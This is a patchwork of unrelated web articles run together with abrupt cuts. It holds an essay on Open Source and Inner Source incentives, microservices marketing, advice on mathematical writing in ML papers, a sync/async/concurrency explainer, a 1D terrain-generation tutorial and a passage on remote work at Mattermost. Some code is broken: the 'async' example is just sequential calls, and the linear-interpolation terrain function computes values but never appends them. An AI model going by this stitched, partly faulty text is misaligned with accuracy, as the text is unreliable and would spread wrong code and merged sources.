<p>In my early years in Open Source I found myself many times discussing with executives and managers about the benefits of this “collaboration framework” and why they should adopt it. Like probably many of you, I found myself being more successful among executives and politicians than middle layer managers.</p>



<p>– “No wonder they are executives” I thought more than once back then.</p>



<p>But time prove me wrong once again.</p>



<p>Problem statement: can we go faster by going together?</p>



<p>It was not until later on in my career, when I could relate to good Open Source evangelists but specially good sales professionals. I learned a bit about how different groups within the same organization are incentivized differently and you need to understand those incentives to tune your message in a a way that they can relate to it.</p>



<p>Most of my arguments and those from my colleagues back then were focused on cost reductions and collaboration, on preventing silos, on shorten innovation cycles, on sustainability, prevention of vendor lock-in, etc. Those arguments resonate very well among those responsible for strategic decisions or those managers directly related with innovation. But they did not work well with execution managers, specially senior ones.</p>



<p>When I have been a manager myself in the software industry, frequently my incentives had little to do with those arguments. In some cases, either my manager’s incentives had little to do with such arguments despite being an Open Organization. Open Source was part of the company culture but management objectives had little to do with collaboration. Variables like productivity, efficiency, time-to-market, customer satisfaction, defects management, release cycles, yearly costs, etc., were the core incentives that drove my actions and those around me. </p>



<p>If that was the case for those organizations I was involved in back then, imagine traditional corporations. Later on I got engage with such companies which confirmed this intuition.</p>



<p>I found myself more than once arguing with my managers about priorities and incentives, goals and KPIs because, as Open Source guy, I was for some time unable to clearly articulate the positive correlation between collaboration and efficiency, productivity, cost reduction etc. In some cases, this inability was a factor in generating a collision that end up with my bones out of the organization.</p>



<p>That positive correlation between collaboration and productivity was counter-intuitive for many middle managers I know ten years ago. Still is for some, even in the Open Source space. Haven’t you heard from managers that if you want to meet deadlines do not work upstream because you go move slower? I’ve heard so many times that, as mentioned before, during years I believed it was true. It might at small scale, but at big scale, it is not necessarily true.</p>



<p>It was not until two or three years ago that I started paying attention to Inner Source. I realized that many have inherited this belief. And since they live in corporate environments, the challenge that represents convincing execution related managers is bigger than in Open Source. </p>



<p>Inner Source programs are usually supported by executives and R&amp;D departments but receive resistance from middle management, especially those closer to execution units. Collaborating with other departments might be good in the long term but it is perceived as less productive than developing in isolation. Somehow, in order to participate in Inner Source programs, they see themselves choosing between shorter-term and longer-term goals, between their incentives and those of the executives. It has little to do with their ability to “<em>get it</em>“.</p>



<p>So either their incentives are changed and they demonstrate that the organization can still be profitable, or you need to adapt to those incentives. What I believe is that adapting to those incentives means, in a nutshell, to provide a solid answer to the question, <em>can we go faster by going together?</em></p>



<p>The proposed solution: if you want to go far, together is faster.</p>



<p>If we could find a positive correlation between efficiency/productivity and collaboration, we could change the proverb above by something like…</p>

<p>And hey, technically speaking, it would still be an African proverb, since I am from the Canary Islands, right?.</p>



<p>The idea behind the above sentence is to establish an <em>AND</em> relation between speed and collaboration meeting both, traditional corporate and Open Source (and Inner Source) goals. </p>



<p>Proving such positive correlation could be help to reduce the resistance offered by middle management to practice collaboration at scale either within Inner Source programs or Open Source projects. They would perceive such participation as a path to meet those longer term goals without contradicting many of the incentives they work with and they promote among their managees.</p>



<p>So the following question is, how we can do that? how can we provide evidences of such positive correlation in a language that is familiar to those managers?</p>



<p>The solution summarized: ISC Fall 2020</p>



<p>I tried to briefly explain to people running Inner Source programs, during the <a href="https://innersourcecommons.org/events/isc-fall-2020-agenda/">ISC Fall 2020</a>, a potential path to establish such relation in five not-so-simple steps. The core slide of my presentation enumerated them as:</p>



<p>1.- In addition to collaboration and community health metrics, I recommend to track product delivery process performance ones.<br>2.- Correlate both groups of metrics.<br>3.- Focus on decisions and actions that creates a positive correlation between them.<br>4.- Create a reporting strategy to developers and managers based on such positive correlation.<br>5.- Use such strategy to turn around your Inner Source/Open Source story: it is about creating positive business impact at scale through open collaboration.</p>



<p>A detailed explanation of these five points can be found in the second article of this series:</p>

Microservices or monolithic – which is better?</strong></h3><p>If you’re about to begin a new project, you might be asking yourself whether you should go with a monolithic or microservices architecture. Or at least you should be asking yourself that question. We’re going to give you some reasons to think seriously about going with microservices.</p><h4><b>What is monolithic vs. microservices architecture?</b></h4><p>Monolithic applications are built and deployed as a single unit. This is the traditional approach to creating applications: all modules are combined in one self-contained codebase.</p><p>All developers work on the same codebase and are committed to a single development stack, including languages, libraries, tools, and everything else used to create the application. Changing any of these elements is a major challenge in a monolithic architecture. Any changes or fixes have the potential to cause problems for everyone involved.</p><p>Microservices take the opposite approach. With a microservices architecture, you divide an application into discrete components that can be developed and deployed completely separately. Any coding language can be used and the development teams can be small and autonomous. Each service represents a particular functionality in the application. If one service has a problem, it won’t take down the entire application and fixes can be quickly rolled out by the relevant team.</p><h4><b>Monolith vs. microservice: the showdown</b></h4><p>Let’s look at ten aspects of applications and see where monolithic and microservices architectures differ.</p><p><strong>1. Size</strong></p><p>A monolithic application is a single self-contained unit. Monolithic applications can get very big over time and your developers can end up dealing with a huge mass of code.</p><p>In contrast, microservices aim to be small independent services that focus on delivering a specific business objective.</p><p><strong>2. Granularity&nbsp;</strong></p><p>All the elements within a monolithic application are tightly coupled and interconnected. Changes made to any part of the application can have effects everywhere. A single bug can mean that the whole application fails.</p><p>Microservices are loosely coupled by design. If there’s a fault, they can be isolated and fixed.</p><p><strong>3. Ease of deployment</strong></p><p>Monolithic applications are not easy to deploy. Making changes can be complicated and deployment is a big deal, involving the entire application.</p><p>Microservices have small teams that can develop and deploy independently. They don’t have to coordinate with everyone else involved in the project.</p><p><strong>4. Speed of deployment&nbsp;</strong></p><p>Not only are monolithic applications more difficult to deploy – they’re also slower. It can take a lot of time to wait for all the changes to be ready and for large development teams to make sure that everything is ready to roll out. Those delays can be very costly, especially if your competitors have made the switch to microservices.</p><p>Again, microservices are designed to be the opposite. Leaner teams developing and deploying their own part of the application mean that microservices can indulge in rapid deployment. Some microservices can even go with continuous deployment and deliver really quick responses to feedback and feature requests.</p><p><strong>5. Communications volume&nbsp;&nbsp;&nbsp;</strong></p><p>Here’s where monolithic applications have an advantage over microservices. Because everything in the application is self-contained, there’s no need for remote calls between services.</p><p>Microservices can end up with significant communication overheads because of all the extra remote calls. While this isn’t catastrophic, it does mean that communication between the microservices has to be designed and managed carefully to avoid bottlenecks because of overly chatty services.</p><p><strong>6. Persistence of data</strong></p><p>All components in a monolithic application share data storage. A single database sits at the lowest level of the architecture of the application and serves information to the entire application. That’s a lot of work for one database and it can mean problems as it gets bigger over time.</p><p>One of the basic principles of microservices is that each service is free to choose its own data storage and to manage its own data. In fact, you should make sure that services don’t share a data store so that you can avoid too much unwanted coupling between services. Like with communications, this can be a challenge. You especially need to rely on domain-driven design to make sure that no microservice can modify the databases of another. Keep each microservice focused on its own business objective.</p><p><strong>7. Ease of onboarding</strong></p><p>A monolithic application can become so complex that it becomes daunting for new hires to understand it all before they get started. It can be difficult for old hands to even explain how everything works!</p><p>With microservices, your new developers just need to understand the code used for their own service. Which means you get them onboard and coding faster and safer.</p><p><strong>8. Polyglot programming</strong></p><p>With a monolithic application, you’re stuck with a single development stack for the whole thing. You can’t decide to use a different programming language for one component or experiment with new approaches to storage solutions.</p><p>Microservices give you the freedom to use a different technology stack whenever you want. You can experiment, optimize, and keep up with new ideas.</p><p><strong>9. Communication method&nbsp;&nbsp;</strong></p><p>Monolithic applications communicate with in-process calls and local method calls. As with everything else, it’s all kept internal and dependent on the language used to develop the application.</p><p>Microservices make use of APIs and a modern RESTful approach to communicating with each other. The architecture is lightweight and technology-neutral, so again you end up with more freedom.</p><p><strong>10. Scalability&nbsp;&nbsp;&nbsp;</strong></p><p>So what about when your application needs to grow?</p><p>Monolithic applications can only scale horizontally. You can run multiple copies of the application. Additional servers, additional resources, and a lot of waste.</p><p>Microservices can be scaled individually as and when needed. Fewer resources get wasted and real business objectives determine where you add them.</p><p><i>At Blocshop, we’ve both converted monolithic applications to microservices and designed and built microservices from scratch. While we believe that the benefits of microservices are clear, we also know that there are horror stories out there about companies that underestimated the task of building or migrating. </i><a href="https://www.blocshop.io/contacts/?utm_source=ebook&amp;utm_medium=microservices&amp;utm_content=contact"><i>Contact us</i></a><i> to find out how you can avoid making the same mistake.

Top advantages of microservices</b></h3><p>Starting a new project or dealing with an unmanageable behemoth of an application? It’s time to decide whether microservices are right for you. To help you make the leap, here are our top ten reasons to choose a microservices future.</p><h4><b>1. Easy and quick scalability</b></h4><p>Need to scale up – or down? It’s much easier when your services are separate. Just identify the services you really need to scale and leave the others untouched. Being able to scale dynamically means that you can grow when you have the demand, rather than trying to predict your needs at the outset.</p><h4><b>2. Leaner teams</b></h4><p>Separating services also means that you can use smaller teams that can work independently of each other. When you get to the point where you need dozens of developers, you don’t want to have to force them all to collaborate and waste time in meetings. Small, autonomous teams can operate faster and more efficiently.</p><p>An extra advantage is that it’s a lot faster to onboard new developers. That new hire no longer needs to understand absolutely everything before they can get coding. And you can try them out in less critical areas without worrying about their every keystroke.</p><h4><b>3. Enhanced productivity</b></h4><p>Those smaller teams will work a lot more efficiently, especially when your product really starts to grow. Not being forced to collaborate with absolutely everyone else lets your developers focus on their own codebase.</p><h4><b>4. Flexibility to experiment and optimize</b></h4><p>You can experiment when you know that you can add or remove features without risking the rest of your application. Want to try optimizing something? Go ahead. You can even decide to try out a new coding language or approach, safe in the knowledge that you aren’t committing to reworking the entire codebase.</p><h4><b>5. Freedom to try out new technology</b></h4><p>This level of flexibility means that you can avoid getting locked into a particular technology or language. If something better comes along, you can try it out, confident that the team involved will be able to roll back the changes smoothly if it doesn’t work out. As more modern technologies emerge, you can switch some of your services without replacing the whole application.</p><p>Microservices also enable you to use multiple languages at once. Each of your teams can choose what works best for their particular part of the project.</p><h4><b>6. Faster deployment</b></h4><p>When each of your services has its own discrete codebase, your teams can deploy faster. Each service can be deployed individually, without affecting other services or teams. Some teams might even choose to use a continuous deployment pipeline. Microservices give you the freedom to have a different deployment process for each part of your project.</p><h4><b>7. Strength in isolation</b></h4><p>If a service fails, it’s not going to take down everything else. You’ll still have to fix it, or use an alternative service, but at least you’ll be dealing with a smaller problem than if you had to debug the whole application. Make use of this fault isolation and ensure that the system can survive failures in some services. You’ll end up with a much more robust product.</p><h4><b>8. Cleaner maintenance and faster response …</b></h4></div></div></div></div></div></div></div></div></section></div></div></div></article></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>Having been a reviewer for numerous machine learning conferences now,
there are some repeated issues I want to point out, concerning the way
authors describe mathematical concepts in their papers. I hope that my
suggestions will serve in particular those that are new to machine
learning and for whom the task of reading a paper with a ‘bad’
mathematical style might seem a daunting prospect. Without further ado,
here are some suggestions for improving your research article.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p>

<p>Your primary objective when writing mathematics should be to build
intuition for readers. This does <em>not</em> mean that you should sacrifice
any rigour or precision—I am just advocating for considering that
a reader of your paper is not an expert in the subject matter yet. If
you want readers to take away some wisdom from the paper, you have to
address their intuition first. No one except an expert in your field
will be swayed by long-winded proofs.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></p>
<p>I am <em>not</em> advocating for sloppy thinking, sloppy writing, or
‘hand-waving’ in your proofs.  I am just saying that the way you lay out
your overall argument should be based on intuition, such that even
reviewers that are not experts in your domain can follow along. If you
only write a paper geared towards a very small audience, you are
reducing its impact and make your life harder because it will almost be
impossible to find good reviewers for it in the conference cycle.</p>

<p>Whenever you introduce notation, try to remain <em>consistent</em>. For
example, if you want to name three objects, prefer calling them $a$, $b$, and
$c$, instead of $\alpha$, $\mathbf{B}$, and $\mathfrak{c}^\prime$.</p>
<p>Whenever possible, follow established terminology—such as calling loss
terms $\mathcal{L}$—but do not assume that the reader is aware of
these conventions. <em>Always</em> take the time to at least briefly introduce
your notation.</p>
<p>This point is in fact closely related to the second issue, namely…</p>

<p>Some people aim to be extremely precise and <em>always</em> employ index-based
notations. For example, instead of referring to objects $a$ and $b$, it
is always $a_1$ and $a_2$ or something. There is nothing wrong with this
in principle, but I would suggest to always strive for as little index
notations as possible and, if only two objects of the same type are needed,
why not use a $\prime$ symbol (<code>\prime</code> in LaTeX) instead of indices?
This can often increase readability and makes you less error-prone
because you do not have to keep track of the indices any more. For
example, in our <a href="https://arxiv.org/abs/2011.03854">survey on graph kernels</a>,
we try to always speak of $G$ and $G^\prime$ when we need to refer to
two graphs. This leaves the indices free for when you actually <em>have</em> to
index something, for example because you are aggregating over objects
arising from a certain set.</p>
<p>In addition, try to adhere to ‘less can be more’ in other places as
well, by removing unnecessary variables, unnecessary concepts, and
unnecessary definitions. It does you credit if you want to explain
<em>everything</em> about a certain field in your paper, but if you introduce
a concept X as a special case of a concept Y, there is no need to go to
great lengths to describe any super-concept Z, unless you actually
<em>need</em> to refer to its properties. This does not mean that you should
leave out salient information—I am suggesting to <em>focus</em> on pertinent
information only. For example, there is no need to expand on properties
of metric spaces, topologies, and so on, if all you need is Lipschitz
continuity. Aim to get to the point quickly and without too many
redirections&nbsp;(unless you are writing a book, but I am assuming that
the reader of this post is interested in writing research papers).</p>
<p>Try also not to fall prey to the tendency to make your formulas more
complex than they have to be. For example, peppering your formulas with
logical quantifiers such as $\forall$ or $\exists$ is more appropriate
when you are publishing in logic. Many people, however, treat these
symbols as shortcuts. Please <em>do</em> resist that temptation. As Knuth
remarks in <a href="https://jmlr.csail.mit.edu/reviewing-papers/knuth_mathematical_writing.pdf">Mathematical Writing</a>,
the overuse of such symbols just decreases readability.</p>
<p>As a corollary to the preceding rule, do <em>not</em> include ‘cosmetic
mathematics’ in your paper.  Every equation, lemma, proposition, or
theorem should be there because it needs to be there. I know that there
is a tendency for reviewers to look favourably on a paper whose
mathematics seem ‘sufficiently complex’, but this is not the right way.
If you want to publish good papers, your first duty is to ensure that
readers of that paper can glean some insights from it. Showing off will
not help in the long run.</p>

<p>Similar to my previous post <a href="http://bastian.rieck.me/blog/posts/2019/on_writing/">on writing in general</a>,
the main thing to remember is to know your audience. In machine
learning, this audience can come from highly different backgrounds. Make
them appreciate the ideas in your paper by guiding them gently into the
mathematics. Reserve the ‘heavy stuff’ for an expert audience that can
give you some actual feedback for it instead of just skimming over it.</p>
<p>Write well, until next time!</p>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>I am assuming throughout this article that your research article
is written for a machine learning conference. You might have to adjust
your writing considerably if you are a mathematician publishing for
other mathematicians—but in machine learning, many people are not
exclusively trained in mathematics, making writing research papers
a little bit more challenging if you want to do it well. <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p>Whether proofs should be included in machine learning papers at
all is still a matter of debate. I think that a rigorous, principled
exposition in a paper is to be welcomed. Yet, the more our community
expands, the more we have to think about how to successfully get the
point across in our papers! At some point, there will not be
a sufficient number of expert reviewers for highly specific papers,
I fear. <a href="#fnref:2" role="doc-backlink">↩︎</a></p>

<p>“How do you distinguish between sync vs. async vs. concurrent vs. parallel?”</p>
</blockquote>
<p>It’s a question you’ll probably be asked in your first technical interview.</p>
<p>Having witnessed a lot of answers from interviewees, I see that people know the terms, but they rarely understand what they conceptually are.</p>
<p>Knowing the use cases is essential. However, just knowing the use cases also limits yourself to only those use cases. That’s why interviewers want to ask you this question⁠ - they want to see whether you’re able to introduce solutions for new use cases.</p>
<p>Now, let’s break the code.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605595364190/9uu39gZuF.png?auto=format&amp;q=60" alt="image.png"></p>
<hr>

<p>Sync and async are two different programming models, which refer to styles of programming - how you should write code and how your code will run.</p>
<h3 id="sync">Sync</h3>
<p>In the sync programming model, you write code as steps ⁠— your code is executed from top to bottom, step by step, and it only gets to the second step when it has finished the first step.</p>
<pre><code><span><span>func</span> <span>step1</span><span>()</span></span> { <span>print</span>(<span>"1"</span>) }
<span><span>func</span> <span>step2</span><span>()</span></span> { <span>print</span>(<span>"2"</span>) }

<span><span>func</span> <span>main</span><span>()</span></span> {
    step1()
    step2()
}


</code></pre><p>Because of its predictable behavior, sync is also called a <em>predictable programming model</em>. Most programming languages use sync as its base programming model.</p>
<h3 id="async">Async</h3>
<p>In an async programming model, you write code as tasks, which are then executed concurrently. Executing concurrently means that all the tasks are likely executed at the same time.</p>
<pre><code><span><span>func</span> <span>task1</span><span>()</span></span> { <span>print</span>(<span>"1"</span>) }
<span><span>func</span> <span>task2</span><span>()</span></span> { <span>print</span>(<span>"2"</span>) }

<span><span>func</span> <span>main</span><span>()</span></span> {
    task1()
    task2()
}


</code></pre><p>As you can see in the result of the example, because tasks are executed at the same time you can not predict the result. And due to that behavior, async is also called an <em>unpredictable programming model</em>. It’s useful for use cases in which you do tasks that do not depend on each other and for which you don’t care about the execution order.</p>
<hr>

<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605596051556/KfHDzfWx8.png?auto=format&amp;q=60" alt="image.png"></p>
<p>We mentioned concurrent behaviors once when discussing the async programming model. In an async programming model, tasks are treated as a single step that runs multiple tasks, and they do not care about how those tasks are ordered or run to each other. They can be run simultaneously, or, in some cases, there’ll be some tasks that run first and then pause and other tasks that come in turns, etc. That behavior is called <em>concurrent</em>.</p>
<p>Take an example in real life: There’s a challenge that requires you to both eat a whole huge cake and sing a whole song. You’ll win if you’re the fastest who sings the whole song and finishes the cake. So the rule is that you sing and eat concurrently. How you do that does not belong to the rule. You can eat the whole cake, then sing the whole song, or you can eat half a cake, then sing half a song, then do that again, etc.</p>
<p>The same applies to computer science. There are two tasks executing concurrently, but those are run in a 1-core CPU, so the CPU will decide to run a task first and then the other task or run half a task and half another task, etc. It all depends on the system architecture.</p>
<p>If we keep going with the same example, the rule is still singing and eating concurrently, but this time you play in a team of two. You probably will eat and let your friend sing (because she sings better and you eat better). So this time, the two tasks are really executed simultaneously, and it’s called <em>parallel</em>. Parallelism is a specific kind of concurrency where tasks are really executed simultaneously. In computer science, parallelism can only be achieved in multicore environments.</p>
<hr>

<p>Sync and async are programming models.</p>
<p>Concurrent and parallel are ways tasks are executed, where parallel is a narrow version of concurrent.</p>
<p>In sync, you write code as steps that are executed in order, from top to bottom. There’s no concurrency or parallelism here.</p>
<p>In async, you write code as tasks that are executed concurrently. You never know which tasks will be started first - it depends on the executing context, whether you run tasks in parallel or do a bit of one task then progress to another.</p>

November 16, 2020 | https://arpitbhayani.me/blogs/1d-terrain | <a href="https://web.archive.org/web/*/https://arpitbhayani.me/blogs/1d-terrain">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Terrains are at the heart of every Computer Game - be it Counter-Strike, Age of Empires, or even Minecraft. The virtual world that these games generate is the key to a great gaming experience. Generating terrain, manually, requires a ton of effort and hence it makes sense to auto-generate a pseudorandom terrain using some procedure. In this essay, we take a detailed look into generating pseudorandom one-dimensional terrain that is very close to real ones.</p>

<p>A one-dimensional terrain is a bunch of heights defined at every point along the X-axis. An example of this could be seen in games like Flappy Bird, Galaxy, and many more. Such terrain could also be traced as the skylines of mountain ranges.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/99189082-70b55e00-2785-11eb-87c0-6d95568f709a.png" alt="https://user-images.githubusercontent.com/4745789/99189082-70b55e00-2785-11eb-87c0-6d95568f709a.png"></p>
<p>The illustration above shows a one-dimensional terrain and is taken as a sketch of a distant mountain range. The procedure we define should generate terrains as close to natural ones as possible.</p>

<p>A naive solution to generate a random terrain is by using the <code>random</code> function for each point along the X-axis. The <code>random</code> function yields random values in the interval <code>[0, 1]</code>, and we map these values to the required height, for example <code>[0, 100]</code>.  The 1D terrain generation algorithm using the default random function is thus defined as</p>
<pre><code><span>import</span> random

<span><span>def</span> <span>mapv</span><span>(v, ol, oh, nl, nh)</span>:</span>
    <span>"""maps the value `v` from old range [ol, oh] to new range [nl, nh]
    """</span>
    <span>return</span> nl + (v * ((nh - nl) / (oh - ol)))

<span><span>def</span> <span>terrain_naive</span><span>(count)</span> -&gt; List[float]:</span>
    <span>"""returns the list of integers representing height at each point.
    """</span>
    <span>return</span> [
        mapv(random.random(), <span>0</span>, <span>1</span>, <span>0</span>, <span>100</span>)
        <span>for</span> i <span>in</span> range(count)
    ]
</code></pre>
<p>The <code>mapv</code> function defined above comes in very handy as it helps us to map value from a source range to a target range. The terrain generation function <code>terrain_naive</code> takes in <code>count</code> as input, suggesting the number of points along the X-axis, and it returns a list of float values representing height at each of the <code>count</code> number of points along the terrain.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/99189731-9db74000-2788-11eb-98d3-0138a7378d77.png" alt="https://user-images.githubusercontent.com/4745789/99189731-9db74000-2788-11eb-98d3-0138a7378d77.png"></p>
<p>The above illustration shows the plot of the one-dimensional terrain using the above <code>terrain_naive</code> function. The terrain generated using this procedure has a lot of spikes and abrupt changes in height and it clearly does not mimic the terrains in the real world. Real-world terrains, although random, does not have a lot of sharp spikes, instead, the changes in height are very gradual and ensure some degree of smoothness.</p>
<p>In order to bring smoothness to <code>terrain_naive</code> generated terrains, we take a look at a famous estimation technique called <a href="https://en.wikipedia.org/wiki/Interpolation">interpolation</a> which estimates intermediate values given a bunch of known points.</p>

<p>Interpolation is a method of constructing new data points within a range of a discrete set of known data points. Interpolation methods estimate the intermediate data points ensuring a "smoothened" transition from one known point to another. There are several interpolation methods but we restrict our focus to <a href="https://en.wikipedia.org/wiki/Linear_interpolation">Linear</a> and <a href="https://en.wikipedia.org/wiki/Trigonometric_interpolation">Cosine</a> interpolation methods.</p>
<h3>Linear Interpolation</h3>
<p>Linear interpolation estimates the intermediate points between the known points assuming collinearity. Thus given two known points <code>a</code> and <code>b</code>, using linear interpolation, we estimate an intermediate point <code>c</code> at a relative distance of <code>mu</code> from <code>a</code> using the function defined below</p>
<pre><code><span><span>def</span> <span>linp</span><span>(a, b, mu)</span>:</span>
    <span>"""returns the intermediate point between `a` and `b`
    which is `mu` factor away from `a`.
    """</span>
    <span>return</span> a * (<span>1</span> - mu) + b * mu
</code></pre>
<p>The value of the parameter <code>mu</code> ranges in the interval <code>[0, 1]</code> where <code>0</code> implies the point being estimated and interpolated is at <code>a</code> while <code>1</code> implies it is at the second point <code>b</code>.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/99184683-d0ead680-276a-11eb-9b4d-6c78dbf3c197.png" alt="https://user-images.githubusercontent.com/4745789/99184683-d0ead680-276a-11eb-9b4d-6c78dbf3c197.png"></p>
<h3>Cosine Interpolation</h3>
<p>Linear interpolation is not always desirable as the plot sees a lot of discontinuous and sharp transitions. When the plot is expected to be smoother, it is where the Cosine Interpolation comes in handy. Instead of assuming intermediate points are collinear with the known ones, Cosine Interpolation, plots them on a cosine curve passing through the known points, providing a much smoother transition. This is could be seen in the illustration above.</p>
<pre><code><span>import</span> math

<span><span>def</span> <span>cosp</span><span>(a, b, mu)</span>:</span>
    <span>"""returns the intermediate point between `a` and `b`
    which is `mu` factor away from `a`.
    """</span>
    mu2 = (<span>1</span> - math.cos(mu * math.pi)) / <span>2</span>
    <span>return</span> a * (<span>1</span> - mu2) + b * mu2
</code></pre>
<p>The above code snippet computes and estimates intermediate point <code>c</code> at a relative distance of <code>mu</code> from the first point <code>a</code> using Cosine Interpolation. Note there are other interpolation methods, but we can solve all major of our use cases using these two.</p>

<p>We can apply interpolation to our naively generated terrain and make transitions smoother leading to fewer spikes. In the real-world, the transitions in the terrain are gradual with peaks being widespread; we can mimic the pattern by sampling <code>k</code> points from the naive terrain which could become our desired peaks, and interpolate the rest of the points lying between them.</p>
<p>This should ideally help us reduce the sudden spikes and make the terrain look much closer to really like. A simple python code that outputs linearly interpolated terrain that samples every <code>sample</code> points from the naive one is as follows</p>
<pre><code><span><span>def</span> <span>terrain_linp</span><span>(naive_terrain, sample=<span>4</span>)</span> -&gt; List[float]:</span>
    <span>"""Using naive terrain `naive_terrain` the function generates
    Linearly Interpolated terrain on sample data.
    """</span>
    terrain = []

    
    sample_points = naive_terrain[::sample]

    
    <span>for</span> i <span>in</span> range(len(sample_points)):

        
        terrain.append(sample_points[i])

        
        
        <span>for</span> j <span>in</span> range(sample - <span>1</span>):
            
            mu = (j + <span>1</span>)/sample
          
            
            a = sample_points[i]
            b = sample_points[(i + <span>1</span>) % len(sample_points)]
            v = linp(a, b, mu)

            

    
    <span>return</span> terrain
</code></pre>
<p>The above code snippet generates intermediate points using Linear Interpolation but we can very easily change the interpolation function to Cosine Interpolation and see the effect in action. The sampling and interpolating on a naively generated terrain for different values of sample is as shown below</p>
<p><img src="https://user-images.githubusercontent.com/4745789/99227920-e7983880-2811-11eb-9c79-bed5cad2eed3.png" alt="https://user-images.githubusercontent.com/4745789/99227920-e7983880-2811-11eb-9c79-bed5cad2eed3.png"></p>
<p>For each interpolation, the 5 plots shown above are sampled for every <code>1</code>, <code>2</code>, <code>3</code>, <code>4</code>, and <code>5</code> points respectively. We can clearly see the plots of Cosine Interpolation are much smoother than Linear Interpolated ones. The technique does a good job over naive implementation but it still does not mimic what we see in the real world. To make things as close to the real-world as possible we use the concept of <a href="https://en.wikipedia.org/wiki/Superposition_principle">Superposition</a>.</p>

<p>Sampling and Interpolation are effective in reducing the spikes and making transitions gradual. The concern with this approach is that sudden changes are not really gone. In order to address this situation, we use the principle of Superposition upon multiple such sampled terrains.</p>
<p>The approach we take here is to generate <code>k</code> such terrains with different sampling frequencies and then perform a normalized weighted sum. This way we get the best of both worlds i.e smoothness from the terrain with the least sampled points and aberrations from the one with the most sampled points.</p>
<p>Now the only piece that remains is choosing the weights. The weights and sampling frequency varies by the power of <code>2</code>. The number of terrains to be sampled depends on the kind of terrain needed and is to be left for experimentation, but we can assume it to be 6 for most use cases.</p>
<p>The terrain that samples all the points should be given the least weight as it aims to contribute sudden spikes; and as we increase the sampling frequency by the power of <code>2</code> we increase the weight by the power of <code>2</code> as well. Hence for the first terrain, the scale is <code>0.03125</code> where were sample all the points <code>256</code>, the next terrain is sampled with <code>128</code> points and has a scale of <code>0.0625</code>, and so on till we reach sampled points to be <code>8</code> with scale as <code>1</code>, giving it the highest weight.</p>
<p>Once these terrains are generated we perform a normalized weighted sum and generate the final terrain as shown in the illustration below.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/99264852-0107a780-2847-11eb-9bd1-2e2994c56028.png" alt="https://user-images.githubusercontent.com/4745789/99264852-0107a780-2847-11eb-9bd1-2e2994c56028.png"></p>
<p>The illustration above shows 6 scaled sampled terrains with different sampling frequencies along with the final super-positioned terrain generated from the procedure. It is very clear that the terrain generated using this procedure is much more closer to the real world terrain than any other we have seen before. Python code that generated the above terrain is as below</p>

<p>If the terrain to be generated is needed to be smoother then instead of using Linear Interpolation switch to Cosine Interpolation and the resultant terrain will be much smoother and curvier as seen in the illustration below.</p>

They were writing code the whole time, and I was on the phone the whole time, and being in the office we ended up interrupting each other. So eventually we started working from our homes and only got together when we needed to catch up.</p><p>As the company grew, we were hiring lots of artists and freelancers based everywhere from Los Angeles to Toronto. Even though there were more of us, it didn’t make sense for us to have an office space when most of the team was somewhere else anyway. We could simply hop on Skype, have our conversation, and get back to work. We became addicted to our ability to source really great talent from anywhere in the world, and addicted to the productivity of not having to worry about the overhead of an office, the time wasted commuting every day, or the frustration of having to find a space to meet up.</p><figure id="attachment_11249" aria-describedby="caption-attachment-11249"><a href="https://youteam.io/blog/wp-content/uploads/2020/10/LIBanner2-scaled.jpg" data-size="{&quot;w&quot;:1920,&quot;h&quot;:1280}"><img loading="lazy" src="https://youteam.io/blog/wp-content/uploads/2020/10/LIBanner2-scaled.jpg" alt="The Mattermost team" width="2560" height="640" srcset="https://youteam.io/blog/wp-content/uploads/2020/10/LIBanner2-scaled.jpg 2560w, https://youteam.io/blog/wp-content/uploads/2020/10/LIBanner2-300x75.jpg 300w, https://youteam.io/blog/wp-content/uploads/2020/10/LIBanner2-1024x256.jpg 1024w, https://youteam.io/blog/wp-content/uploads/2020/10/LIBanner2-768x192.jpg 768w, https://youteam.io/blog/wp-content/uploads/2020/10/LIBanner2-1536x384.jpg 1536w, https://youteam.io/blog/wp-content/uploads/2020/10/LIBanner2-2048x512.jpg 2048w, https://youteam.io/blog/wp-content/uploads/2020/10/LIBanner2-716x179.jpg 716w, https://youteam.io/blog/wp-content/uploads/2020/10/LIBanner2-820x205.jpg 820w" sizes="(max-width: 2560px) 100vw, 2560px"></a><figcaption id="caption-attachment-11249">The Mattermost team</figcaption></figure><p>That isn’t to say scaling a remote team has been easy. We’ve learned a lot about what makes for a great remote experience. Here are a few of the lessons learned about the challenges of remote work, and how we make it work for our team.</p><h2><strong>Pair design helps remote collaboration run smoothly</strong></h2><p>One of the superpowers of a remote team is <a href="https://about.gitlab.com/company/culture/all-remote/asynchronous/">embracing the ability to work asynchronously</a>. Unfortunately, this can also make large group collaboration more challenging. There are certain problems you might want a relatively large group to work together — for example, planning our annual onsite. In an office setting, you’d just get those four or five or seven people together camped out in a conference room for a whole week, knocking out the problem. But it can be particularly challenging to wrangle a large group of people to carve out a long chunk of time to work together remotely. Everyone has other priorities they’re trying to juggle.</p><p>We’ve found what works best for remote collaboration is keeping the collaboration smaller. We try to apply <a href="https://uxdesign.cc/benefits-of-design-pairing-2a3ceb0bdfac?gi=df46f7c04818">pair design</a> practices wherever we can; if you can break down and prioritize bigger problems into smaller problems two people can tackle, they can work through the problem, talk through it, and agree on it. Then, when they come back to a broader group, they come in with a much more polished solution and it’s easier to get an idea implemented.</p><h2><strong>Documentation is the secret to great onboarding and culture building</strong></h2><p>There’s a bit of a misconception that companies can only build stronger cultures in-person versus remote. I would say culture is stronger when everything is written down because everyone who joins the company has the same baseline: a consistent onboarding experience and documentation as the shared source of truth.</p><p>Remote onboarding done right can be far more scalable, efficient, and impactful. We get a good deal of positive feedback for our onboarding process at Mattermost because <a href="https://handbook.mattermost.com/operations/workplace/people/working-at-mattermost/onboarding">everything is documented</a>. In-office onboarding experiences are usually a series of person-to-person interactions that mete out information bit by bit — you might talk to 18 different people throughout the day, each with a different piece of the organizational 